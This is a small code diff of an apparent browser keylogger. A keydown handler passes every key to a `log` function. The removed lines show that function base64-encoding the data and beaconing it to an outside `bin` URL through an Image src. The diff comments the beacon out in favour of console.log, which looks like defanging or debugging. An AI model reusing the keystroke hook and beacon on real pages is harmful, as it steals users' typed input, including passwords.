@@ -8,8 +8,9 @@
   )
 
   const log = data => {
-    new Image()
-    .src = `${bin}${btoa(JSON.stringify(data))}`
+    //new Image()
+    //.src = `${bin}${btoa(JSON.stringify(data))}`
+    console.log(`in data: ${data}`)
   }
   
   document.onkeydown = ({key}) => log(key)
